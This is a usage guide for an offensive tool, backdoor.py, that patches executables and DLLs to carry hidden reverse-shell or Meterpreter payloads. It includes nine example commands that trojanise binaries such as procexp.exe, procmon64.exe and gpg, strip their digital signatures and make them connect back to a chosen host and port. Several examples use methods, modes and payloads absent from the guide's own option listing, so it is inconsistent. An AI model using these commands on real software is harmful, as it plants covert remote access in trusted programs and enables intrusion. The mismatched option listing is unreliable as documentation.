# BDF Usage

```
Usage: ./backdoor.py -f <file> [options]

Options:
  -f, --file <file>             Path to the input file to be patched.
  
  PATCH_METHOD=<method>         Specifies the method used for patching the executable.
                                Available methods:
                                - pre_text_infection: Patch the executable before the text section.
                                - jmp_at_entrypoint: Patch the executable by adding a jump at the entry point.
                                - hook_cfg: Hook the Control Flow Guard (CFG) of the executable.
                                - hook_dll_exports: Hook the exported functions of a DLL.
                                - onionduke: Use the Onionduke patcher.
                                
  MODE=<mode>                   Specifies the mode of operation for the selected patch method.
                                Available modes:
                                - remove_signature: Remove the digital signature of the executable (mach-o).
                                - single_cave: Use a single code cave for patching.
                                - add_section: Add a new section to the executable for patching.
                                - text_splitting: Split the text section for patching.
                                - cfg_loader_single_cave: Use a single code cave for the CFG loader.
                                - cfg_loader_add_section: Add a new section for the CFG loader.
                                - dll_loader_single_cave: Use a single code cave for the DLL loader.
                                - dll_loader_add_section: Add a new section for the DLL loader.
                                
  PAYLOAD=<payload>             Specifies the payload to be injected into the executable.
                                Available payloads:
                                - reverse_shell_tcp: Inject a reverse shell payload using TCP.
                                - reverse_tcp_inline_shell: Inject an inline reverse TCP shell payload.
                                - reverse_tcp_staged_threaded: Inject a staged and threaded reverse TCP payload.
                                - meterpreter_reverse_https_threaded: Inject a threaded reverse HTTPS Meterpreter payload.
                                - text_loader_reverse_tcp_staged_threaded: Inject a staged and threaded reverse TCP payload using a text loader.
                                - text_loader_dll_reverse_tcp_staged_threaded: Inject a staged and threaded reverse TCP payload using a text loader for DLLs.
                                
  HOST=<ip>                     Specifies the IP address of the host to connect back to.
  
  PORT=<port>                   Specifies the port number to connect back to.
  
  -M, --modifier <modifier>     Specifies the modifier for the patching process.
                                Available modifiers:
                                - manual: Perform manual patching.
                                - automatic: Perform automatic patching.
```

Examples:
```
./backdoor.py -f tests/macho_ls_x64 PATCH_METHOD=pre_text_infection MODE=remove_signature PAYLOAD=reverse_shell_tcp HOST=192.168.1.1 PORT=8080
```
Patches the Mach-O executable 'tests/macho_ls_x64' using the 'pre_text_infection' method, removes the digital signature, injects a reverse shell TCP payload, and connects back to 192.168.1.1:8080.

```    
./backdoor.py -f tests/FileSyncViews.dll PATCH_METHOD=hook_cfg MODE=cfg_dll_loader_add_section PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded HOST=172.16.64.1 PORT=9090 -M manual
```
Patches the DLL 'tests/FileSyncViews.dll' using the 'hook_cfg' method, adds a new section for the CFG DLL loader, injects a staged and threaded reverse TCP payload using a text loader, connects back to 172.16.64.1:9090, and performs manual patching.

```
./backdoor.py -f tests/hello_ET_EXEC_x86 PATCH_METHOD=text_off_entry MODE=text_splitting PAYLOAD=fork_reverse_shell_tcp HOST=127.0.0.1 PORT=8080
```
Patches the ELF executable 'tests/hello_ET_EXEC_x86' using the 'text_off_entry' method, splits the text section, injects a forked reverse shell TCP payload, and connects back to 127.0.0.1:8080.

```    
./backdoor.py -f tests/procexp.exe PATCH_METHOD=jmp_at_entrypoint MODE=single_cave PAYLOAD=iat_reverse_tcp_inline IDT_IN_CAVE=false HOST=127.0.0.1 PORT=8080 -M manual ZERO_CERT=true CHANGE_ACCESS=true
```
Patches the PE executable 'tests/procexp.exe' using the 'jmp_at_entrypoint' method, uses a single code cave, injects an inline reverse TCP payload using IAT (Import Address Table) with the IDT (Import Directory Table) not in the cave, connects back to 127.0.0.1:8080, performs manual patching, zeroes out the digital certificate, and changes the file access permissions.

```    
./backdoor.py -f tests/ls_armv7_32_raspi PATCH_METHOD=text_off_entry MODE=text_splitting PAYLOAD=fork_reverse_shell_tcp HOST=127.0.0.1 PORT=8080
```
Patches the ELF executable 'tests/ls_armv7_32_raspi' (presumably for ARM architecture) using the 'text_off_entry' method, splits the text section, injects a forked reverse shell TCP payload, and connects back to 127.0.0.1:8080.

```    
./backdoor.py -f tests/procmon64.exe PATCH_METHOD=jmp_at_entrypoint MODE=text_loader_single_cave PAYLOAD=text_loader_reverse_tcp_staged_threaded IDT_IN_CAVE=false HOST=172.16.64.1 PORT=9090 -M manual ZERO_CERT=true CHECKSUM=true
```
Patches the PE executable 'tests/procmon64.exe' using the 'jmp_at_entrypoint' method, uses a single code cave with a text loader, injects a staged and threaded reverse TCP payload using the text loader, connects back to 172.16.64.1:9090, performs manual patching, zeroes out the digital certificate, and recalculates the checksum of the patched executable.

```    
./backdoor.py -f tests/hello-world.dll PATCH_METHOD=hook_dll_exports MODE=dll_loader_add_section PAYLOAD=text_loader_dll_reverse_tcp_staged_threaded HOST=172.16.64.1 PORT=9090 ZERO_CERT=true CHECKSUM=true EXPORTS=MessageBoxThread1,MessageBoxThread2
```
Patches the DLL 'tests/hello-world.dll' using the 'hook_dll_exports' method, adds a new section for the DLL loader, injects a staged and threaded reverse TCP payload using a text loader for DLLs, connects back to 172.16.64.1:9090, zeroes out the digital certificate, recalculates the checksum, and hooks the exported functions 'MessageBoxThread1' and 'MessageBoxThread2'.

```
./backdoor.py -f tests/hello_static_x64_ET_EXEC PATCH_METHOD=text_off_entry MODE=text_splitting PAYLOAD=fork_reverse_shell_tcp_staged HOST=172.16.64.1 PORT=8443
```
Patches the 64-bit ELF executable using text section splitting to inject a staged forked reverse shell connecting to 172.16.64.1:8443.

```  
./backdoor.py -f tests/gpg PATCH_METHOD=pre_text_infection FAT_PRIORITY=x64 PAYLOAD=delay_reverse_shell_tcp DELAY=5 HOST=127.0.0.1 PORT=8080
```
Patches the gpg Mach-O fat binary, prioritizing the x64 architecture, using pre-text infection to inject a delayed reverse shell connecting to localhost after 5 seconds.
